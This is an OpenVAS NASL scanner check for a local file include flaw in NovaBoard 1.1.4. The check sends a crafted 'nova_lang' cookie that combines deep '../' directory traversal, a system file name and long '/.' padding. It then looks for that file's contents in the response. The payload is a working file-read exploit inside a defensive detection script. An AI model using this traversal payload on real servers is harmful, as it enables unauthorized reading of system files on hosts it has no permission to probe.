###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_novaboard_44459.nasl 13865 2019-02-26 07:43:10Z ckuersteiner $
#
# NovaBoard 'nova_lang' Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:novaboard:novaboard";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100874");
  script_version("$Revision: 13865 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-26 08:43:10 +0100 (Tue, 26 Feb 2019) $");
  script_tag(name:"creation_date", value:"2010-10-28 13:41:07 +0200 (Thu, 28 Oct 2010)");
  script_bugtraq_id(44459);
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");

  script_name("NovaBoard 'nova_lang' Local File Include Vulnerability");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/44459");
  script_xref(name:"URL", value:"http://www.htbridge.ch/advisory/lfi_in_novaboard.html");
  script_xref(name:"URL", value:"http://www.novaboard.net/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("novaboard_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("novaboard/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"NovaBoard is prone to a local file-include vulnerability because it
fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to obtain potentially sensitive information or to execute arbitrary
local scripts in the context of the webserver process. This may allow the attacker to compromise the application
and the computer, other attacks are also possible.

NovaBoard 1.1.4 is vulnerable, other versions may also be affected.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade
  to a newer release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

trav = crap(data:"/.",length:8000);

files = traversal_files();

foreach file (keys(files)) {
  req = string("GET ", dir, "/index.php HTTP/1.1\r\n",
               "Host: ", get_host_name(),"\r\n",
               "Cookie: nova_lang=../../../../../../../../../../../../../../",files[file],"/././././.",trav,";\r\n",
               "\r\n\r\n"
               );

  res = http_send_recv(port:port, data:req);
  if(res == NULL)
    exit(0);

  if(egrep(pattern:file, string:res)) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
